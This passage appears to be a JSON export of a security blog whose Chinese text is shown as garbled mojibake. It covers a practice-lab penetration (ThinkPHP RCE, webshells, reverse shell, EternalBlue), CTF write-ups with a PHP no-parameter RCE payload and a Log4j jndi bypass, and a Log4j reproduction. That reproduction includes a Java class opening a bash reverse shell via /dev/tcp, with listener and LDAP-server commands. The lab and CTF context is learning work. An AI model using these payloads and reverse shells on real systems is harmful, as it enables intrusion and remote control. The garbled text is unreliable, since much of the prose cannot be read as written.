é¶åœºæ­å»ºå†äº†å•ä½çš„ä¸€å°Thinkpadä¸Šï¼Œä½†æ˜¯ï¼è·¯ç”±å™¨ç»å¸¸ä¼šç‚¸ï¼Œåœ¨åé¢æˆ‘ä¼šè§£é‡Šä¸€ä¸‹ä¸ºå•¥æå‰è¯´ä¸€ä¸‹è¿™ä¸ª ç”±äºæ—¶é—´çŸ­ï¼Œæˆ‘æ²¡æœ‰å®Œæˆæ•´ä¸ªæ¸—é€çš„è¿‡ç¨‹ï¼Œå°±ç®€å•è®°å½•ä¸€ä¸‹æ¸—é€å­¦ä¹  æ¥ä¸‹æ¥è¯´æ˜ä¸€ä¸‹æ•´ä¸ªé¶åœºçš„æ‹“æ‰‘ æˆ‘ä»¬é¦–å…ˆå‡è£…ä¸€ä¸‹ï¼Œè¯¥ç¯å¢ƒæ˜¯åœ¨å…¬ç½‘ç¯å¢ƒä¸‹ æœ‰ä¸¤ä¸ªwebæœåŠ¡ ä¸€ä¸ªåŸŸæ§ ä¸¤ä¸ªåŸŸç”¨æˆ· WEB1æ˜¯ç»™å‡ºæ¥çš„ï¼šhttp://192.168.8.128:8081/ å‰©ä¸‹çš„æˆ‘ä»¬é€æ­¥æ”¶é›† WEB1ä¸ºï¼šhttp://192.168.8.128:8081/ è®¿é—®å‘ç°webåº”ç”¨æ˜¯tpæ¡†æ¶ ä¸”ç‰ˆæœ¬ä¸ºv5.0.x éšä¾¿ç»™ä¸€ä¸ªæŒ‡ï¼Œé€ æˆdebugçœ‹ä¸€ä¸‹æŠ¥é”™é¡µé¢ç»™æ²¡ç»™ç‰ˆæœ¬å· å¯ä»¥çœ‹åˆ°ï¼Œè¯¥Thinkç‰ˆæœ¬ä¸ºV5.0.15ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨å·¥å…·æˆ–è€…æ‰‹æµ‹ä¸€ä¸‹ ç»è¿‡æµ‹è¯•å­˜åœ¨ThinkPHP5 5.0.22/5.1.29 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ éšä¾¿ä¸Šä¸€ä¸ªwebshellå¹¶ä¸”ç”¨èšå‰‘è¿æ¥ä¸€ä¸‹ï¼Œè¿æ¥åå¯ä»¥çœ‹åˆ°è¿˜æœ‰å…¶ä»–çš„åŒäº‹ä¹Ÿä¸Šäº†ä¸€å¥è¯ï¼ˆæˆ‘çš„é©¬æ˜¯H3.php,å°±æ˜¯ç®€å•çš„ä¸€å¥è¯ï¼‰ ç„¶åä¸Šä¼ å†°èæœ¨é©¬ï¼ˆå…¶å®è¿™ä¸€æ­¥æœ‰ç‚¹å¤šä½™äº†ï¼Œæˆ‘æœ¬æ¥æƒ³è¦ä¸ºäº†æ–¹ä¾¿ææƒï¼Œå’Œåˆ©ç”¨msfï¼Œä½†æ˜¯å‘ç°è¿™é‡Œå¹¶ä¸éœ€è¦ç‰¹åˆ«é«˜çš„æƒé™ï¼‰ åˆ©ç”¨å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°è‡ªå·±çš„kaliä¸­ï¼Œè¿›è¡Œåæ¸—é€å·¥ä½œ åœ¨è¿™é‡ŒæˆåŠŸåå¼¹åˆ°äº†shellï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥ç»§ç»­ä¿¡æ¯æ”¶é›† ä¸Šä¼ ä¸€ä¸ªfscan æ‰«ä¸€ä¸‹cæ®µï¼Œå‘ç°äº†web2çš„æœåŠ¡ï¼Œå¹¶ä¸”çœ‹åˆ°äº†web2çš„æœåŠ¡å™¨æœ‰ç€åŒç½‘å¡ï¼Œè¿™é‡Œå…ˆæ”¾åœ¨è¿™ä¸åŠ¨ å‘ç°äº†ä¸åŒæ®µçš„ipæ‰«ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸å‡ºç½‘ï¼Œfrpå¸¦å‡ºæ¥ï¼Œå‘ç°æ˜¯ä¸ªTomcatçš„æ ·ä¾‹ç•Œé¢ï¼Œæ­¤æ—¶åˆé™·å…¥äº†åƒµå±€ï¼Œå› ä¸ºåœ¨æˆ‘çš„å°è±¡ä¸­è¿™ç©æ„æ²¡æœ‰å•¥åˆ©ç”¨çš„åœ°æ–¹ï¼ˆè¿™é‡ŒæœåŠ¡å™¨å´©äº†ä¸€æ¬¡ï¼Œå¯¼è‡´IPå’Œæˆ‘æ‰«åˆ°çš„åœ°æ–¹ä¸ä¸€æ ·ï¼Œå°é—®é¢˜ï¼‰ çœ‹åˆ°äº†445æƒ³æ‰“æ°¸æ’ä¹‹è“æ‰“ä¸é€šï¼ˆè¿™é‡Œå¿˜è®°æˆªå±äº†ï¼‰ï¼Œéšå³æ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–çš„ä¸œè¥¿ æ‰«åˆ°äº†adminï¼Œè®¿é—®ä¸€ä¸‹ å¤§å†™çš„Shiroï¼ˆShiroå’ŒLog4jå…»æ´»äº†å¤§å †å®‰å…¨äººå‘˜ æ»‘ç¨½è„¸.jpgï¼‰ è€Œä¸”bpçš„æ’ä»¶ç›´æ¥ç»™äº†keyï¼Œè¿™å°±ä¸ç”¨é—®å¤šè¯´äº†æŠŠ ç›´æ¥è¿›è¡Œshiro_attackï¼Œå¹²ä»–ï¼ æŸ¥çœ‹ç½‘å¡ Windows IP é…ç½® ä»¥å¤ªç½‘é€‚é…å™¨ Ethernet0: è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::c900:af0f:9fe0:d91c%13 IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.251.112 å­ç½‘æ©ç  . . . . . . . . . . . . : 255.255.254.0 é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.250.1 ä»¥å¤ªç½‘é€‚é…å™¨ Ethernet1: è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::310a:8deb:67a7:832d%12 IPv4 åœ°å€ . . . . . . . . . . . . : 10.10.10.4 å­ç½‘æ©ç  . . . . . . . . . . . . : 255.255.255.0 é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : éš§é“é€‚é…å™¨ isatap.{B0A725AE-0F5A-475D-B790-B922E4F0ECBB}: åª’ä½“çŠ¶æ€ . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€ è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : éš§é“é€‚é…å™¨ isatap.{F5E4AD16-A6C6-4F43-B6C5-F927AEBD7A45}: åª’ä½“çŠ¶æ€ . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€ è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : å°è¯•æ³¨å…¥å†…å­˜é©¬æ— æ•ˆï¼Œå¯ä»¥åˆ©ç”¨csä¸Šçº¿ åˆ©ç”¨shiro RCE åŠ ä¸Šcsçš„powershell ä¸Šçº¿ æˆåŠŸå°†ç›®æ ‡æœºå™¨ä¸Šçº¿ï¼ˆä½ ä¼šå‘ç°è¿™é‡Œçš„ipåˆå˜å›åŒæ®µäº†ï¼Œå› ä¸ºå®åœ¨æ˜¯è·¯ç”±å™¨é­ä¸ä½é‚£ä¹ˆå¤šçš„ç©¿é€ç›´æ¥å‡‰äº†ï¼Œç»è¿‡è®¨è®ºæŠŠweb2æ”¾å¼€ç›´æ¥æ‰“ï¼‰ çœ‹ä¸€ä¸‹ç½‘å¡ å‘ç°äº†ä¸åŒAæ®µçš„IPåœ°å€ fscanæ‰«ä¸€ä¸‹ 10.10.10.3:139 open 10.10.10.4:139 open 10.10.10.4:8080 open 10.10.10.6:445 open 10.10.10.3:445 open 10.10.10.4:445 open 10.10.10.6:139 open 10.10.10.6:135 open 10.10.10.3:135 open 10.10.10.4:135 open NetInfo: [*]10.10.10.4 [-&gt;]Windows2012 [-&gt;]192.168.8.142 [-&gt;]10.10.10.4 NetInfo: [*]10.10.10.6 [-&gt;]Windows2008 [-&gt;]10.10.10.6 [*] WebTitle:http://10.10.10.4:8080 code:200 len:20 title:Apache Tomcat/8.5.73 [*] 10.10.10.4 WORKGROUP\\WINDOWS2012 Windows Server 2012 R2 Standard 9600 NetInfo: [*]10.10.10.3 [-&gt;]Win7 [-&gt;]10.10.10.3 [*] 10.10.10.6 HACK\\WINDOWS2008 Windows Server 2008 R2 Standard 7601 Service Pack 1 [+] 10.10.10.3 MS17-010 (Windows 7 Ultimate 7601 Service Pack 1) [*] 10.10.10.6 (Windows Server 2008 R2 Standard 7601 Service Pack 1) [*] 10.10.10.3 \u0001\u0002__MSBROWSE__\u0002\\WIN7 Windows 7 Ultimate 7601 Service Pack 1 ä¼ ä¸€ä¸ªnpsï¼Œåšå†…ç½‘ç©¿é€ï¼Œå¸¦åˆ°è‡ªå·±ä¸»æœºé‡Œï¼ˆè¿™é‡Œä¹Ÿæ˜¯è‡ªå·±æƒ³è¦å­¦ä¹ ä¸€ä¸‹npsï¼Œå†…ç½‘æˆ‘å¾ˆèœï¼ŒåŸºæœ¬ä¸Šæ²¡æ‰“è¿‡ï¼‰ æˆåŠŸå¸¦å‡ºæ¥äº† å›åˆ°ä¸Šæ–‡çš„fscanæ‰«æç»“æœå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªWin7 è€Œä¸”445ä¹Ÿæ˜¯æ‰“å¼€çš„ï¼ˆè¿™æˆ‘å°±å¤ªæ‡‚äº†ï¼‰ ç›´æ¥è€ƒè™‘æ°¸æ’ä¹‹è“ï¼ å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´ï¼Œé‚£è¿˜è¯´å•¥äº†ï¼å¹²ä»–ï¼ï¼ï¼ï¼ å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘è¿™é‡Œæ‰“äº†tmçš„15æ¬¡ï¼Œæ¢äº†å„ç§ç‰ˆæœ¬çš„expï¼Œä½†æ˜¯éƒ½æ— æ³•è¿æ¥æˆåŠŸåˆ©ç”¨ï¼Œæ­¤æ—¶å·²ç»å¿«è¦ä¸‹ç­äº† 233333 ä¸å‡ºä¼—æœ›ï¼Œåœ¨ç¬¬30+æ¬¡çš„æ—¶å€™ å®ƒè“å±äº†ã€‚ã€‚ã€‚ã€‚ã€‚ ç„¶åæˆ‘ä¹Ÿå°±ä¸‹ç­äº†ï¼Œæˆ‘çš„ç¬¬ä¸€æ¬¡æ¸—é€å°±åˆ°è¿™é‡Œäº†ï¼Œå¦‚æœè¿™ä¸ªåŸŸç”¨æˆ·æˆåŠŸæ‰“ç©¿äº†ï¼Œä¹Ÿè®¸èƒ½æœ‰å¯èƒ½è¿›è¡Œæ¨ªç§»ï¼Œæ‹¿åŸŸæ§ï¼ˆè¾¹çœ‹å¤§å¸ˆå‚…çš„blogï¼Œè¾¹é—®æˆ‘å¸ˆå‚…ï¼Œæˆ‘å¾ˆèœ2333ï¼‰ï¼Œä¸è¿‡è¿™æ¬¡çš„æ¸—é€ç»™äº†æˆ‘å¾ˆå¤§çš„å¯å‘ã€‚ ç¬¬ä¸€ç‚¹ã€å¯¹äºåˆšåˆšæ¥è§¦çš„åŒå­¦ä»¬ï¼Œä¸€å®šè¦åšå¥½ä¿¡æ¯æ”¶é›†çš„å·¥å…·ï¼Œèƒ½å¤Ÿåœ¨ä¿¡æ¯æ”¶é›†çš„é˜¶æ®µåœ¨è‡ªå·±çš„è„‘è¢‹é‡Œå½¢æˆä¸€å¹…æ‹“æ‰‘å›¾ ç¬¬äºŒç‚¹ã€è¦ç†Ÿæ‚‰å¸¸è§çš„æ¸—é€å·¥å…·ï¼šmsfã€csã€nmapã€fsacnç­‰ç­‰ ç¬¬ä¸‰ç‚¹ã€è¦å¯¹æ¸—é€å¸¸ç”¨CVEæ¼æ´å­¦ä¼šåˆ©ç”¨å’Œææƒæ‰‹æ³•ï¼Œæ¯”å¦‚æ°¸æ’ä¹‹è“ ç¬¬å››ç‚¹ã€è¦ä¼šå†…ç½‘ç©¿é€å’Œå¤šå±‚ä»£ç†ï¼Œè¿™ä¸ªå¾ˆå¤šå¸ˆå‚…éƒ½å†™äº†æ–‡ç« å¯ä»¥å­¦ä¹ å­¦ä¹  å­¦ä¹ æ°¸æ— æ­¢å¢ƒï¼Œè¦å¤šç»ƒä¹ ï¼Œå¤šæ€è€ƒï¼Œç»éªŒå¾ˆæœ‰ç”¨ï¼Œçº¸ä¸Šè°ˆå­¦ä¸å¦‚åŠ¨æ‰‹å®è·µï¼Œå¯¹äºæˆ‘ä¸€ä¸ªCTFeræ¥è¯´ï¼Œå†…ç½‘çš„çŸ¥è¯†æ¥è§¦å¾ˆå°‘ï¼Œä½†æ˜¯åœ¨æ•´ä¸ªé¶åœºçš„æ¸—é€é€”ä¸­ï¼ŒæŠŠæ¯ä¸ªæ­¥éª¤éƒ½ç»†åˆ†ï¼Œè¿™æ ·å°±æœ‰äº†å¾ˆæ˜ç¡®çš„ç›®çš„ï¼Œä¹Ÿå°±æŠŠä¸€ä¸ªå¤§ç›®æ ‡åˆ’åˆ†æˆå°ç›®æ ‡ï¼ŒæŒ‰ç…§æ­¥éª¤æ¥ï¼Œé‡åˆ°ä¸ä¼šçš„ä¸œä¸œå°±å»ç°åœºå­¦ä¹ å¹¶ä¸”æ•´ç†ç¬”è®°ï¼Œå°±ä¼šå®¹æ˜“å¾—å¤šã€‚","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"http://h3geeker.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"http://h3geeker.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"é•¿å®‰â€œæˆ˜ç–«â€ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ› éƒ¨åˆ†wp","slug":"é•¿å®‰æˆ˜ç–«","date":"2022-01-08T12:23:22.867Z","updated":"2022-01-08T12:43:34.195Z","comments":true,"path":"posts/5b82dfff.html","link":"","permalink":"http://h3geeker.top/posts/5b82dfff.html","excerpt":"","text":"å…«å¦è¿·å®«æŠ˜ç£¨ï¼ï¼ï¼ï¼ cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang} RCE_No_ParaPHPæ— å‚æ•°RCE å‚è€ƒè‡ªï¼šhttps://blog.csdn.net/qq_38154820/article/details/106329976 if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) ä»£ç ä¼šå°†$_GET[â€˜codeâ€™]ä¸­æ»¡è¶³æ­£åˆ™/[^\\W]+((?R)?)/çš„éƒ¨åˆ†ï¼Œæ›¿æ¢ä¸ºç©ºï¼Œç„¶åæŸ¥çœ‹æ˜¯å¦å‰©ä¸‹çš„éƒ¨åˆ†å¼ºç­‰äº,å¦‚æœæ»¡è¶³ï¼Œåˆ™æ‰§è¡Œ ç¬¬äºŒå±‚bypass if(!preg_match('/session|end|next|header|dir/i',$_GET['code'])) å¯¹å‡ ä¸ªå…³é”®è¯è¿›è¡Œäº†è¿‡æ»¤ å‘ç°endè¢«è¿‡æ»¤äº† æ‰€ä»¥ç”¨array_rand()å‡½æ•°ä»£æ›¿end() payloadä¸ºï¼š /?code=eval(array_rand(current(get_defined_vars())));&amp;system(\"ls\"); å‘ç°äº†php ç›´æ¥cat å³å¯ è¥¿å®‰åŠ æ²¹ä¸€åˆ°æµé‡é¢˜ çœ‹äº†ä¸€ä¸‹æ²¡å‘ç°ä»€ä¹ˆ å¯¼å‡ºå…¨éƒ¨çš„httpå¯¹è±¡ å‘ç°äº†ä¸¤ä¸ªæ–‡ä»¶ æŠŠä¸¤ä¸ªtxtæ–‡æœ¬çš„å†…å®¹éƒ½æ”¾åˆ°CyberChefè§£ç  çœ‹èµ·æ¥secret.txtæ˜¯å‹ç¼©åŒ…ï¼Œæ¨æ–­å‹ç¼©åŒ…ä¸­çš„å†…å®¹å°±æ˜¯å›¾ç‰‡ è¿˜åŸå‹ç¼©åŒ…æ–‡ä»¶ æŒ‰ç…§æç¤ºçš„å†…å®¹æ‹¼å›¾ flagï¼š cazy{make_XiAN_great_Again} Shiro?ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯shiro å°±åˆ©ç”¨shiro attack ä½†æ˜¯å‘ç°å¹¶èƒ½å¹²ä»€ä¹ˆï¼Œåªèƒ½æ‰§è¡Œå‡ ä¸ªå‘½ä»¤ï¼ˆè¿™ä¸ªè«åçš„jarä¹Ÿæ˜¯å¾ˆå¯ç–‘ï¼‰ æ­¤æ—¶æˆ‘éšä¾¿è¾“å…¥ç”¨æˆ·åå¯†ç  å‘ç°éƒ½æ˜¯ok æ­¤æ—¶é«˜åº¦æ€€ç–‘log4jRCE ç„¶åå°è¯•äº†ä¸€ä¸‹åå¼¹shellï¼Œå‘ç°æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯ä¸çŸ¥é“ä»€ä¹ˆè¿‡æ»¤ ç»è¿‡æµ‹è¯•å‘ç°æ˜¯jndiè¢«è¿‡æ»¤äº†ï¼Œè€Œä¸”å¯ä»¥å¤§å°å†™ç»•è¿‡ ç›´æ¥Log4jå¹²ä»–ï¼ æœ´å®æ— åçš„å–è¯ç¡®å®æœ´å®æ— å æ–‡ä»¶åç»™äº†ç³»ç»Ÿä¿¡æ¯ç›´æ¥volå–è¯ å…ˆçœ‹ä¸€ä¸‹å†…å­˜é‡Œæœ‰ä»€ä¹ˆæ–‡ä»¶ ï¼ˆè´´ä¸€ä¸‹ç»è¿‡æˆ‘ç­›é€‰çš„æ–‡ä»¶ï¼‰ 0x0000000001b301c0 1 0 RW-r-- \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\æ¡Œé¢\\æˆ‘çš„æ—¥è®°.txt.txt 0x0000000001b34f90 1 1 R--r-- \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\æ¡Œé¢\\flag.zip 0x0000000001e65028 1 0 R--rw- \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\æ¡Œé¢\\flag.png åˆ†åˆ«æ‰“å¼€çœ‹ä¸€ä¸‹ flag.png ä¸€ä¸²æ„ä¹‰ä¸æ˜çš„å­—ç¬¦ä¸²ä»¥åŠå‡ºé¢˜äººç¾ç”»ï¼ flag.zip åŠ å¯†è¿‡çš„ä¸€ä¸ªå‹ç¼©åŒ… æˆ‘çš„æ—¥è®°.txt è¿™é‡Œç»™äº†éƒ¨åˆ†çš„åŠ å¯†è„šæœ¬ å›¾ç‰‡ä¸­çš„å­—ç¬¦ä¸² FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF] å‡¯æ’’äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰è¹Šè··åœ¨é‡Œé¢ æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ¤æ–­è¿™ä¸ªåŠ å¯†æ˜¯åŠ å¯†è„šæœ¬+å‡¯æ’’ å‰©ä¸‹çš„å°±æ˜¯æµ‹è¯•æ‰¾è§„å¾‹ è´´ä¸€ä¸‹exp str = \"FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]\" str = [a for a in str] for a in range(0,len(str)): str[a] = chr(ord(str[a])+32) #fdcb{Xldq_zloo_fhuwdlqob_vxffhhg_lq_iljkwlqj_wkh_hslghplf} for a in range(0,len(str)): if str[a] &gt;= \"d\" and str[a]&lt;=\"z\": str[a] = chr(ord(str[a])-3) elif str[a]=='a': str[a]='x' elif str[a]=='b': str[a]='y' elif str[a]=='c': str[a]='z' elif str[a]=='|': str[a]=\"_\" str = \"\".join(str) print(str) #cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"å¤§èµ›wp","slug":"å¤§èµ›wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"}]},{"title":"2021SCTF-Loginme","slug":"Loginme","date":"2021-12-28T01:32:57.167Z","updated":"2021-12-28T01:47:08.363Z","comments":true,"path":"posts/54f35dc.html","link":"","permalink":"http://h3geeker.top/posts/54f35dc.html","excerpt":"","text":"æœ€è¿‘ä¹Ÿæ˜¯åˆšåˆšæ”¾å‡ï¼Œæ¯”è¾ƒå¿™ï¼Œå°±çœ‹äº†çœ‹è¿™ä¸ªSCTF æ¯”èµ›å¿«åˆ°å°¾å£°çš„æ—¶å€™æ‰æŠ½å‡ºç©ºæ¥çœ‹çœ‹é¢˜ æŒ‰ç…§æƒ¯ä¾‹ï¼Œè‚¯å®šæ˜¯è¦çœ‹çœ‹åˆ†æœ€å°‘çš„é¢˜ è¿™é“é¢˜è¢«æˆ‘çœ‹ä¸­äº†ï¼Œæˆ‘æ‰“ç®—ç ”ç©¶ä¸€ä¸‹è¿™ä¸ªé¢˜ é™„ä»¶æ˜¯ä¸€ä»½æºç ï¼Œè€Œä¸”æ˜¯goè¯­è¨€çš„æºç  æˆ‘ä»¬æ¥çœ‹ä¸€çœ‹ é¢˜ä¸­æºç ç»™äº†middleware.go æ­¤æ—¶æˆ‘ä»¬åº”è¯¥ç†è§£ä¸€ä¸‹goè¯­è¨€çš„ä¸­é—´ä»¶æ˜¯èµ·åˆ°ä»€ä¹ˆä½œç”¨çš„ æœ‰æ—¶å€™åœ¨æ‰§è¡Œå®é™…Handleré‡Œé¢çš„é€»è¾‘çš„æ—¶å€™æƒ³è¦é¢„å¤„ç†æˆ–è€…åå¤„ç†ä¸€äº›è¡Œä¸ºï¼ˆæ¯”å¦‚å†™å…¥logã€ç»Ÿè®¡æ‰§è¡Œæ—¶é—´ç­‰ç­‰ï¼‰ï¼›æœ‰æ—¶å€™æˆ‘ä»¬æƒ³è¦åœ¨è°ƒç”¨ä¸€ä¸ªHandlerä¹‹å‰æˆ–ä¹‹åè°ƒç”¨å¦ä¸€ä¸ªHandlerã€‚è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°ä¸­é—´ä»¶è¿™ä¸ªä¸­é—´å¤„ç†å‡½æ•°ï¼ŒæŠŠæˆ‘ä»¬å®é™…ä½¿ç”¨çš„Handleræ”¾åœ¨ä¸­é—´ä»¶é‡Œé¢ï¼Œä»¥å®ç°é¢å¤–çš„åŠŸèƒ½ã€‚ æ‰€ä»¥æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹middleware.goå®šä¹‰äº†ä»€ä¹ˆ package middleware import ( \"github.com/gin-gonic/gin\" ) func LocalRequired() gin.HandlerFunc { return func(c *gin.Context) { if c.GetHeader(\"x-forwarded-for\") != \"\" || c.GetHeader(\"x-client-ip\") != \"\" { c.AbortWithStatus(403) return } ip := c.ClientIP() if ip == \"127.0.0.1\" { c.Next() } else { c.AbortWithStatus(401) } } } è¿™é‡Œå¯¼å…¥äº†ä¸€ä¸ªåŒ…github.com/gin-gonic/gin æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¯¥åŒ…çš„æè¿° Gin is a web framework written in Go (Golang). It features a martini-like API with performance that is up to 40 times faster thanks to httprouter. If you need performance and good productivity, you will love Gin. ------------------------------------------------------------------------------- Gin æ˜¯ä¸€ä¸ªç”¨ Go (Golang) ç¼–å†™çš„ Web æ¡†æ¶ã€‚ å®ƒå…·æœ‰ç±»ä¼¼martini-likeçš„ APIï¼Œç”±äº httprouterï¼Œæ€§èƒ½æé«˜äº† 40 å€ã€‚ å¦‚æœæ‚¨éœ€è¦æ€§èƒ½å’Œè‰¯å¥½çš„ç”Ÿäº§åŠ›ï¼Œæ‚¨ä¼šå–œæ¬¢ Ginã€‚ åˆ°è¿™é‡Œå…¶å®å°±æœ‰é‚£ä¹ˆä¸€ç‚¹èƒ½æ„Ÿè§‰åˆ°è¿™ä¸ªé¢˜çš„åšæ³•äº† æ¥ç€å¾€ä¸‹çœ‹ func LocalRequired() gin.HandlerFunc { return func(c *gin.Context) { if c.GetHeader(\"x-forwarded-for\") != \"\" || c.GetHeader(\"x-client-ip\") != \"\" { c.AbortWithStatus(403) return } ip := c.ClientIP() if ip == \"127.0.0.1\" { c.Next() } else { c.AbortWithStatus(401) } } } è¿™é‡Œå°±æ˜¯ç®€å•çš„è·å–æ•°æ®å¤´çš„å‡½æ•° å…¶ä¸­ if c.GetHeader(\"x-forwarded-for\") != \"\" || c.GetHeader(\"x-client-ip\") != \"\" { c.AbortWithStatus(403) return } è¿™é‡Œå®šä¹‰åˆ°å¦‚æœå­˜åœ¨x-forwarded-foræˆ–è€…x-client-ipå°±ä¼šè¿”å›403 ä½†æ˜¯è¿˜éœ€è¦ip == \"127.0.0.1\" ç™¾åº¦ä¸€ä¸‹å°±çŸ¥é“x-real-ipè¿™ä¸ªå¤´ ä¸­é—´ä»¶çœ‹å®Œäº†ï¼Œæ¥ç€å¾€ä¸‹çœ‹route.go è¿™é‡Œå°±èƒ½çœ‹åˆ°ç«¯å€ªäº† goè¯­è¨€æ¨¡æ¿æ¸²æŸ“æ”¯æŒä¼ å…¥ä¸€ä¸ªç»“æ„ä½“çš„å®ä¾‹æ¥æ¸²æŸ“å®ƒçš„å­—æ®µï¼Œå°±æœ‰å¯èƒ½é€ æˆä¿¡æ¯æ³„éœ² è€Œåœ¨route.goä¸­æ°å·§ä¼ å…¥äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œæˆ‘ä»¬æ¥ç€çœ‹structs.go åˆ°è¿™é‡Œå·²ç»çœŸç›¸å¤§ç™½äº† 1ã€é¦–å…ˆæ„é€ ipä¼ªé€  2ã€åœ¨ageå˜é‡ä¸­å­˜åœ¨sstiä¿¡æ¯æ³„éœ²å‡ºflag 3ã€å¹²ä»–ï¼","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"å¤§èµ›wp","slug":"å¤§èµ›wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"}]},{"title":"CTFSHOWLog4jå¤ç°","slug":"CTFSHOWlog4jå¤ç°wp","date":"2021-12-10T15:10:21.792Z","updated":"2021-12-10T15:59:48.785Z","comments":true,"path":"posts/b8d6ddff.html","link":"","permalink":"http://h3geeker.top/posts/b8d6ddff.html","excerpt":"","text":"ä»Šå¤©ä¸Šåˆåˆšåˆšçœ‹å®Œè¿™ä¸ªæ´ï¼Œè‡ªå·±å¤ç°äº†ä¸€ä¸‹ï¼Œæ™šä¸Šå°±çœ‹åˆ°äº†ä¸Šé¢˜æ­£å¥½æ‰“ä¸€ä¸‹ç©ç© å¤šæ˜æ˜¾çš„è¾“å…¥æ¡†ï¼Œå˜¿å˜¿å˜¿ è¿™ä¸å¾—æ¥ä¸€ä¸ª ${jndi:ldap://dnslog.com/exp} (bushi 0x01 å‡†å¤‡å·¥ä½œé¦–å…ˆå‡†å¤‡å¥½æ¶æ„Javaç±» public class Test { static{ try { Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/xxx/50025;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\"}; Process p = r.exec(cmd); p.waitFor(); }catch (Exception e){ e.printStackTrace(); } } } èƒ½å¼¹shellå°±è¡Œï¼Œæ€ä¹ˆå†™éƒ½è¡Œ ç„¶åå‡†å¤‡å¥½marshalsec-0.0.3-SNAPSHOT-all.jar 0x02 ç›‘å¬ç«¯å£nc -lvnp 50025 0x03 èµ·httpæœåŠ¡python3 -m http.server 50026 æ³¨æ„è¿™é‡Œè¦åœ¨æ¶æ„Javaç±»çš„ç›®å½•ä¸‹èµ·httpæœåŠ¡ 0x04 èµ·LDAPæœåŠ¡java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://xxx:50026/#Test\" è¿™é‡Œçš„ç«¯å£è¦å’ŒhttpæœåŠ¡çš„ç«¯å£ä¸€è‡´ï¼ï¼ 0x05 å¹²ä»–ï¼å–œé—»ä¹è§çš„çš„åœ°æ–¹æ¥äº† ç‚¹å‡»submit å¯ä»¥çœ‹åˆ°è¿™é‡Œå·²ç»åŠ è½½äº†æ¶æ„ç±»ï¼Œè€Œæˆ‘ä»¬ç›‘å¬çš„ç«¯å£å·²ç»åå¼¹åˆ°äº†shell æ‰“å®Œæ”¶å·¥ï¼ åç»­ä¹Ÿä¼šå†™ä¸€ä¸‹è¿™ä¸ªæ¼æ´çš„æºç åˆ†æï¼Œå°±æ˜¯ä¸çŸ¥é“è®©ä¸è®©å‘ã€‚","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"åšé¢˜è®°å½•","slug":"åšé¢˜è®°å½•","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"SQLæ³¨å…¥åŸºç¡€","slug":"sqlæ³¨å…¥åŸºç¡€","date":"2021-12-06T12:25:28.274Z","updated":"2021-12-06T12:29:56.638Z","comments":true,"path":"posts/e1ba94c8.html","link":"","permalink":"http://h3geeker.top/posts/e1ba94c8.html","excerpt":"","text":"ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ç†è§£SQLæ³¨å…¥SQLæ³¨å…¥æ˜¯ä¸€ç§å°†SQLä»£ç æ’å…¥æˆ–æ·»åŠ 